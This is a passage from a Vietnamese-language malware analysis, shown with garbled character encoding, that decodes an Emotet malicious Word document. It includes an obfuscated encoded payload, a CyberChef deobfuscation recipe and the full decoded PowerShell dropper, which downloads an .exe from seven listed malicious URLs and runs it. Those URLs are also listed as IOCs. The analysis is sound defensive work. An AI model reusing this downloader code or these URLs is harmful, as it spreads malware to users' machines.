:An, A :AD, A :AA, A :bg, A :An, A :AC, A :sA, A :Jw, A :Bn, A :AC, A :cA, A :Kw, A :An, A :AG, A :YA, A :ag, A :An, A :AC, A :sA, A :KA, A :An, A :AG, A :MA, A :Jw, A :Ar, A :AC, A :cA, A :Lw, A :BO, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AC, A :oA, A :Jw, A :Ar, A :AC, A :cA, A :aA, A :B0, A :AH, A :QA, A :Jw, A :Ar, A :AC, A :cA, A :cA, A :A6, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :Lw, A :An, A :AC, A :sA, A :KA, A :An, A :AC, A :8A, A :Jw, A :Ar, A :AC, A :cA, A :aw, A :Bo, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bh, A :AH, A :IA, A :Jw, A :Ar, A :AC, A :cA, A :YQ, A :B6, A :AG, A :0A, A :aQ, A :An, A :AC, A :sA, A :Jw, A :Bz, A :AG, A :MA, A :aA, A :Bs, A :AC, A :4A, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :MA, A :bw, A :An, A :AC, A :sA, A :Jw, A :Bt, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :Lw, A :B3, A :AC, A :cA, A :Kw, A :An, A :AC, A :8A, A :Jw, A :Ap, A :AC, A :4A, A :Ig, A :Bz, A :AG, A :AA, A :UA, A :Bs, A :AG, A :kA, A :VA, A :Ai, A :AC, A :gA, A :Ww, A :Bj, A :AG, A :gA, A :YQ, A :By, A :AF, A :0A, A :NA, A :Ay, A :AC, A :kA, A :Ow, A :Ak, A :AE, A :cA, A :cQ, A :Ax, A :AD, A :gA, A :NA, A :B4, A :AH, A :AA, A :PQ, A :Ao, A :AC, A :cA, A :Tg, A :An, A :AC, A :sA, A :Jw, A :Az, A :AG, A :oA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :B3, A :AC, A :cA, A :Kw, A :An, A :AG, A :sA, A :NA, A :Bt, A :AC, A :cA, A :KQ, A :Ap, A :AD, A :sA, A :Zg, A :Bv, A :AH, A :IA, A :ZQ, A :Bh, A :AG, A :MA, A :aA, A :Ao, A :AC, A :QA, A :SQ, A :B5, A :AH, A :oA, A :dg, A :B2, A :AD, A :UA, A :aw, A :Ag, A :AG, A :kA, A :bg, A :Ag, A :AC, A :QA, A :TQ, A :Bu, A :AH, A :YA, A :bg, A :Ay, A :AG, A :MA, A :Yg, A :Ap, A :AH, A :sA, A :dA, A :By, A :AH, A :kA, A :ew, A :Ak, A :AE, A :UA, A :Nw, A :Ay, A :AH, A :cA, A :Yg, A :Bk, A :AG, A :EA, A :Lg, A :Ai, A :AG, A :QA, A :Tw, A :B3, A :AG, A :AA, A :Tg, A :BM, A :AE, A :8A, A :YQ, A :Bk, A :AG, A :YA, A :SQ, A :Bg, A :AG, A :wA, A :RQ, A :Ai, A :AC, A :gA, A :JA, A :BJ, A :AH, A :kA, A :eg, A :B2, A :AH, A :YA, A :NQ, A :Br, A :AC, A :wA, A :IA, A :Ak, A :AF, A :AA, A :ZQ, A :Ax, A :AG, A :UA, A :cg, A :Bu, A :AD, A :IA, A :KQ, A :A7, A :AC, A :QA, A :Rw, A :A1, A :AD, A :IA, A :eg, A :Bh, A :AD, A :AA, A :bA, A :A9, A :AC, A :gA, A :Jw, A :BI, A :AH, A :AA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :B2, A :AD, A :YA, A :Jw, A :Ar, A :AC, A :cA, A :eQ, A :Bw, A :AD, A :cA, A :Jw, A :Ap, A :AC, A :kA, A :Ow, A :BJ, A :AG, A :YA, A :IA, A :Ao, A :AC, A :gA, A :Jg, A :Ao, A :AC, A :cA, A :Rw, A :An, A :AC, A :sA, A :Jw, A :Bl, A :AH, A :QA, A :LQ, A :BJ, A :AH, A :QA, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :Bt, A :AC, A :cA, A :KQ, A :Ag, A :AC, A :QA, A :UA, A :Bl, A :AD, A :EA, A :ZQ, A :By, A :AG, A :4A, A :Mg, A :Ap, A :AC, A :4A, A :Ig, A :BM, A :AG, A :UA, A :Tg, A :Bn, A :AG, A :AA, A :VA, A :BI, A :AC, A :IA, A :IA, A :At, A :AG, A :cA, A :ZQ, A :Ag, A :AD, A :MA, A :MQ, A :A3, A :AD, A :cA, A :Nw, A :Ap, A :AC, A :AA, A :ew, A :Am, A :AC, A :gA, A :Jw, A :BJ, A :AG, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :dg, A :An, A :AC, A :sA, A :Jw, A :Bv, A :AG, A :sA, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :At, A :AE, A :kA, A :dA, A :Bl, A :AG, A :0A, A :Jw, A :Ap, A :AC, A :gA, A :JA, A :BQ, A :AG, A :UA, A :MQ, A :Bl, A :AH, A :IA, A :bg, A :Ay, A :AC, A :kA, A :Ow, A :Ak, A :AE, A :cA, A :Yw, A :Bw, A :AH, A :YA, A :Ng, A :By, A :AG, A :0A, A :PQ, A :Ao, A :AC, A :cA, A :VA, A :A1, A :AC, A :cA, A :Kw, A :An, A :AH, A :oA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Bn, A :AG, A :QA, A :Jw, A :Ar, A :AC, A :cA, A :Nw, A :A3, A :AC, A :cA, A :KQ, A :Ap, A :AD, A :sA, A :Yg, A :By, A :AG, A :UA, A :YQ, A :Br, A :AD, A :sA, A :JA, A :BS, A :AH, A :AA, A :Ng, A :Bt, A :AH, A :MA, A :cg, A :Bs, A :AD, A :0A, A :KA, A :Ao, A :AC, A :cA, A :Vw, A :B3, A :AC, A :cA, A :Kw, A :An, A :AG, A :4A, A :Yw, A :B2, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :cg, A :Bk, A :AC, A :cA, A :KQ, A :B9, A :AH, A :0A, A :Yw, A :Bh, A :AH, A :QA, A :Yw, A :Bo, A :AH, A :sA, A :fQ, A :B9, A :AC, A :QA, A :Ug, A :Bj, A :AG, A :IA, A :Mg, A :A5, A :AG, A :QA, A :cA, A :A9, A :AC, A :gA, A :Jw, A :BL, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :cQ, A :Br, A :AC, A :cA, A :Kw, A :An, A :AG, A :UA, A :eA, A :An, A :AC, A :kA, A :Kw, A :An, A :AH, A :oA, A :aA, A :An, A :AC, A :kA
```

![image alt](https://hackmd.io/_uploads/BkWivoYhyx.png)

![image alt](https://hackmd.io/_uploads/SyKCKjt3Jx.png)

ChÃºng ta cÃ³ thá»ƒ tháº¥y pháº§n cÃ²n thiáº¿u cho lá»‡nh `powershell` phÃ­a trÃªn lÃ  `ll`

Äáº§u tiÃªn, chÃºng ta muá»‘n thÃªm chá»©c nÄƒng `"From Base64"` theo sau lÃ  `"Remove Null bytes"`. Äiá»u nÃ y sáº½ lÃ m cho táº£i trá»ng Ä‘Ã£ dá»… Ä‘á»c hÆ¡n. Tuy nhiÃªn, váº«n cÃ³ má»™t sá»‘ chuá»—i Ä‘Æ°á»£c thÃªm vÃ o nhÆ° má»™t pháº§n cá»§a sá»± xÃ¡o trá»™n mÃ  bÃ¢y giá» chÃºng ta cÃ³ thá»ƒ báº¯t Ä‘áº§u thay tháº¿ tá»«ng cÃ¡i má»™t. Äiá»u nÃ y sáº½ yÃªu cáº§u má»™t vÃ i chá»©c nÄƒnng Find/Replace bá»• sung (vá»›i tÃ¹y chá»n simplestring!). Sau Ä‘Ã³, chÃºng ta sáº½ káº¿t thÃºc vá»›i mÃ£ PowerShell thuáº§n tÃºy, báº£n thÃ¢n nÃ³ cÃ³ má»™t vÃ i chuá»—i bá»‹ xÃ¡o trá»™n. Äá»ƒ giáº£i mÃ£ toÃ n bá»™ táº£i trá»ng tá»« Ä‘áº§u Ä‘áº¿n cuá»‘i, cÃ³ thá»ƒ sá»­ dá»¥ng cÃ´ng thá»©c bÃªn dÆ°á»›i vÃ  nháº­p nÃ³ vÃ o Cyberchef.

```
Find_/_Replace({'option':'Regex','string':', A :'},'',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'LL -ENCOD'},'',true,false,true,false)
From_Base64('A-Za-z0-9+/=',true,false)
Remove_null_bytes()
Find_/_Replace({'option':'Simple string','string':'\')+(\''},'',true,false,true,false)
Find_/_Replace({'option':'Simple string','string':'\'+\''},'',true,false,true,false)
Find_/_Replace({'option':'Simple string','string':'`'},'',true,false,true,false)
Find_/_Replace({'option':'Simple string','string':'\'+(\''},'',true,false,true,false)
Find_/_Replace({'option':'Simple string','string':'\')+\''},'',true,false,true,false)
```

**Payload** hoÃ n chá»‰nh nhÆ° sau

```
$Pha9n8s = ('Ql8o_fh'));.('new-item') $ENV: UseRPROFIlE\ Wg__3MD\ vPny24V\ - itemtype DIRECtOrY;
[Net.ServicePointManager]::"secuRItYprOtoCol" = ('tls12, tls11, tls');
$Lnc8cly = (('Zc1o6l'));
$Havkcad = ('R31m6l2'));
$Pe1ern2 = $env: userprofile + ((('KbQWg__3mdKbQVpny24vKbQ') - RePLACe('KbQ'), [cHar] 92) + $Lnc8cly + (('.exe'); $Zz6nqp1 = ('Sinyych')); $E72wbda = .('new-object') nET.webcLieNT; $Mnvn2cb = (('http://prestokitchens.com/recurringo/fRe/*http://www.djraisor.com/error/w7G3/*http://dakarbuzz.net/css/CyKg/*https://wildecapitalmgmt.net/wp-content/j6/*http://californiaasa.com/californiaasa.com/8t/*http://viralbrown.com/e3c0ngfjc/N/*http://kharazmischl.com/w/').
		"sPliT"([char] 42); $Gq184xp = ('N3jwk4m')); foreach($Iyzvv5k in $Mnvn2cb) {
		try {
			$E72wbda.
			"dOwNLOadfIlE"($Iyzvv5k, $Pe1ern2);
			$G52za0l = ('Hpv6yp7'));
		If(( & ('Get-Item') $Pe1ern2).
			"LeNgTH" - ge 31777) {
			& ('Invoke-Item')($Pe1ern2);
			$Gcpv6rm = ('T5zgd77'));
		break;
		$Rp6msrl = (('Wwncvrd')
		}
	} catch {}
}
$Rcb29dp = ('Kqkexzh')
```

NÃ³ xÃ¡c Ä‘á»‹nh má»™t `thÆ° má»¥c ngáº«u nhiÃªn` trong `há»“ sÆ¡ ngÆ°á»i dÃ¹ng` vÃ  `tÃªn` ngáº«u nhiÃªn cho má»™t tá»‡p `.exe` sáº½ Ä‘Æ°á»£c táº£i xuá»‘ng. NÃ³ khá»Ÿi táº¡o má»™t á»©ng dá»¥ng `web .NET` báº±ng cÃ¡ch sá»­ dá»¥ng cÃ¡c `giao thá»©c báº£o máº­t TLSv1.` Pháº§n thÃº vá»‹ nháº¥t lÃ  cÃ³ má»™t `danh sÃ¡ch cÃ¡c URL` mÃ  táº­p lá»‡nh láº·p láº¡i trong vÃ²ng láº·p for cá»‘ gáº¯ng táº£i xuá»‘ng pháº§n má»m Ä‘á»™c háº¡i tá»« cÃ¡c liÃªn káº¿t Ä‘á»™c háº¡i nÃ y. Khi táº£i xuá»‘ng thÃ nh cÃ´ng, vÃ­ dá»¥: kÃ­ch thÆ°á»›c tá»‡p lá»›n hÆ¡n 31777 byte, nÃ³ sáº½ ngáº¯t khá»i vÃ²ng láº·p vÃ  gá»i (thá»±c thi) tá»‡p. Tá»‡p nÃ y vá» cÆ¡ báº£n lÃ  `trojan Emotet`, sau Ä‘Ã³ sáº½ tiáº¿p cáº­n cÆ¡ sá»Ÿ háº¡ táº§ng chá»‰ huy vÃ  Ä‘iá»u khiá»ƒn vÃ  cung cáº¥p cho káº» táº¥n cÃ´ng quyá»n kiá»ƒm soÃ¡t há»‡ thá»‘ng báº±ng cÃ¡ch sá»­ dá»¥ng nhiá»u tÃ­nh nÄƒng Ä‘i kÃ¨m vá»›i cÃ´ng cá»¥.

Danh sÃ¡ch cÃ¡c `IOC` tá»« payload

```
http://prestokitchens.com/recurringo/fRe/
http://www.djraisor.com/error/w7G3/
http://dakarbuzz.net/css/CyKg/
https://wildecapitalmgmt.net/wp-content/j6/
http://californiaasa.com/californiaasa.com/8t/
http://viralbrown.com/e3c0ngfjc/N/
http://kharazmischl.com/w/
```

**IOC (Indicator of Compromise)** lÃ  chá»‰ bÃ¡o vá» sá»± xÃ¢m pháº¡m, tá»©c lÃ  cÃ¡c dáº¥u hiá»‡u hoáº·c báº±ng chá»©ng cho tháº¥y má»™t há»‡ thá»‘ng Ä‘Ã£ bá»‹ táº¥n cÃ´ng hoáº·c Ä‘ang cÃ³ nguy cÆ¡ bá»‹ xÃ¢m nháº­p.

BÃ¢y giá» ta Ä‘Ã£ hiá»ƒu Ä‘áº§y Ä‘á»§ vá» hÃ nh vi cá»§a mÃ£ Ä‘á»™c Ä‘Æ°á»£c nhÃºng trong tÃ i liá»‡u. Ta cÅ©ng biáº¿t cÃ¡c bÆ°á»›c tiáº¿p theo trong chuá»—i lÃ¢y nhiá»…m vÃ  nhá»¯ng Ä‘iá»u cáº§n chÃº Ã½. Trong mÃ´i trÆ°á»ng doanh nghiá»‡p, giá» Ä‘Ã¢y chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng cÃ¡c IOC Ä‘Æ°á»£c trÃ­ch xuáº¥t Ä‘á»ƒ cháº·n chÃºng, tÃ¬m kiáº¿m báº¥t ká»³ káº¿t ná»‘i nÃ o trÆ°á»›c Ä‘Ã³ vÃ  báº¯t Ä‘áº§u sÄƒn lÃ¹ng cÃ¡c lÃ¢y nhiá»…m bá»• sung.

# Emotet Maldoc Demonstration

Ta Ä‘Ã£ cÃ³ thá»ƒ `giáº£i mÃ£` vÃ  `phÃ¢n tÃ­ch maldoc` hoÃ n toÃ n thÃ´ng qua phÃ¢n tÃ­ch `tÄ©nh` vÃ  cÃ¡c cÃ´ng cá»¥ dÃ²ng lá»‡nh. Tuy nhiÃªn, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng `Microsoft Word` hoáº·c `LibreOffice` Ä‘á»ƒ má»Ÿ vÃ  xem tÃ i liá»‡u vÃ  Macro. Äiá»u nÃ y chá»‰ nÃªn Ä‘Æ°á»£c thá»±c hiá»‡n trong mÃ´i trÆ°á»ng sandbox cÃ³ thá»ƒ Ä‘Æ°á»£c hoÃ n nguyÃªn vá» tráº¡ng thÃ¡i trÆ°á»›c Ä‘Ã³ vÃ  Ä‘Ã£ táº¯t káº¿t ná»‘i internet

**LibreOffice**

![image alt](https://hackmd.io/_uploads/rJPbyhY21l.png)

Khi má»Ÿ tÃ i liá»‡u, chÃºng ta cÃ³ thá»ƒ tháº¥y má»™t hÃ¬nh áº£nh gÃ¢y hiá»ƒu láº§m vÃ  cÃ¡c dÃ²ng vÄƒn báº£n nhá» bÃªn dÆ°á»›i. Khi thay Ä‘á»•i kÃ­ch thÆ°á»›c vÄƒn báº£n, chÃºng ta cÃ³ thá»ƒ tháº¥y ráº±ng Ä‘Ã¢y lÃ  `máº«u trÃ´ng Ä‘Ã¡ng ngá»`, hÃ³a ra lÃ ` táº£i trá»ng Ä‘Æ°á»£c mÃ£ hÃ³a.`

Tiáº¿p theo, chÃºng ta cÃ³ thá»ƒ báº¯t Ä‘áº§u Ä‘iá»u tra Macro. Äá»ƒ lÃ m nhÆ° váº­y, cáº§n má»Ÿ pháº§n NhÃ  phÃ¡t triá»ƒn trong Word, hoáº·c trong LibreOffice, Ä‘i tá»›i `Tools -> Macro -> Edit Macro.`

![image alt](https://hackmd.io/_uploads/rkh8k2Khkx.png)

Trong trÃ¬nh chá»‰nh sá»­a Macro, chÃºng ta cÃ³ thá»ƒ tháº¥y cáº¥u trÃºc cá»§a tÃ i liá»‡u bao gá»“m cÃ¡c pháº§n chá»©a mÃ£ xÃ¡o trá»™n. Äá»‘i tÆ°á»£ng document "`S88ecjif1ml6`" chá»©a hÃ m `Document_open` vÃ  trong mÃ´-Ä‘un biá»ƒu máº«u "`Bkc5re_xxwma`", chÃºng ta cÃ³ thá»ƒ tháº¥y cÃ¡c hÃ m liÃªn quan cá»§a nÃ³ tá»« mÃ£ VBA. ÄÃ¢y lÃ  má»™t cÃ¡ch Ä‘á»ƒ xem vÃ  trÃ­ch xuáº¥t mÃ£ Macro.

Tuy nhiÃªn, ta nhá»› ráº±ng cÅ©ng cÃ³ cÃ¡c `trÆ°á»ng áº©n Ä‘Æ°á»£c liÃªn káº¿t vá»›i Ä‘á»‘i tÆ°á»£ng biá»ƒu máº«u` mÃ  ta Ä‘Ã£ xÃ¡c Ä‘á»‹nh trÆ°á»›c Ä‘Ã³. ChÃºng ta cÃ³ thá»ƒ má»Ÿ má»¥c biá»ƒu máº«u ngÆ°á»i dÃ¹ng Ä‘Æ°á»£c liÃªn káº¿t vá»›i "`Bkc5re_xxwma`" vÃ  á»Ÿ cuá»‘i danh sÃ¡ch. ChÃºng ta cÃ³ thá»ƒ tháº¥y bÃªn dÆ°á»›i ráº±ng biá»ƒu máº«u ngÆ°á»i dÃ¹ng trÃ´ng trá»‘ng rá»—ng. Tuy nhiÃªn, khi chÃºng ta di chuyá»ƒn box, chÃºng ta cÃ³ thá»ƒ tháº¥y ráº±ng cÃ³ má»™t sá»‘ trÆ°á»ng Ä‘Æ°á»£c sáº¯p xáº¿p chá»“ng lÃªn nhau. Sau khi bÃ³c tÃ¡ch cÃ¡c lá»›p trÆ°á»ng, bÃ¢y giá» chÃºng ta cÃ³ thá»ƒ tháº¥y ráº±ng má»™t sá»‘ tÃªn trÆ°á»ng nÃ y Ä‘Ã£ Ä‘Æ°á»£c tham chiáº¿u lÃ m biáº¿n trong mÃ£ VBA, sau Ä‘Ã³ táº£i cÃ¡c giÃ¡ trá»‹ vÄƒn báº£n cá»§a chÃºng, vÃ­ dá»¥: `"P", "tu" vÃ  "tar"`.

![image alt](https://hackmd.io/_uploads/rkqnJ2F3ke.png)
